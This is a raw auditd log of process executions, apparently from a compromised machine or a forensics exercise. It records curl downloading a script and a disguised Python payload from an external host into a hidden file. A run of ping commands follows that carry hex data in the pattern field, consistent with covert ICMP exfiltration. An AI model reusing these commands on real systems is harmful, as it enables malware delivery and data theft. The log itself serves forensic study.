type=EXECVE msg=audit(1742907868.476:1044): argc=2 a0="curl" a1="http://vastation.null:8080/install_nptdate.sh"
type=EXECVE msg=audit(1742907868.920:1175): argc=5 a0="curl" a1="-fsSL" a2="http://vastation.null:8080/ntpdate_util.cpython-37.pyc" a3="-o" a4="/opt/fJQsJUNS/.sys"
type=EXECVE msg=audit(1742907868.944:1176): argc=5 a0="curl" a1="-fsSL" a2="http://vastation.null:8080/readme.md" a3="-o" a4="/opt/fJQsJUNS/.rdme"
type=EXECVE msg=audit(1742907871.360:1289): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="a08508333fbef26b26cd9e17100edf59" a5="vastation.null"
type=EXECVE msg=audit(1742907871.372:1293): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="8eef494a4028c635873e2b16293b0e7d" a5="vastation.null"
type=EXECVE msg=audit(1742907871.384:1297): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="c1d24536d469f7cffac27bac054c66ab" a5="vastation.null"
type=EXECVE msg=audit(1742907871.392:1302): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="34d30beaac97e0bde68266c55c733a5f" a5="vastation.null"
type=EXECVE msg=audit(1742907871.404:1306): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="2343b02dddd1ec0cdd49b160051b7d91" a5="vastation.null"
type=EXECVE msg=audit(1742907871.416:1310): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="7c44234d6b4298dbbcf7e3c3fd006635" a5="vastation.null"
type=EXECVE msg=audit(1742907871.424:1314): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="f26eff1b449b90fa8cfa4640ac11acab" a5="vastation.null"
type=EXECVE msg=audit(1742907871.436:1318): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="9d22292d666db61618be241c4747835e" a5="vastation.null"
type=EXECVE msg=audit(1742907871.448:1322): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="e7cf0b775e261ddbe4a74cb4292b5159" a5="vastation.null"
type=EXECVE msg=audit(1742907871.456:1326): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="60c746174db575d76d1f1b644c75ca46" a5="vastation.null"
type=EXECVE msg=audit(1742907871.468:1330): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="7897aaf73ac977a91e9fd0791d7732bd" a5="vastation.null"
type=EXECVE msg=audit(1742907871.480:1334): argc=6 a0="ping" a1="-c" a2="1" a3="-p" a4="23bca091aa2a6b76843f1cf806963d12" a5="vastation.null"
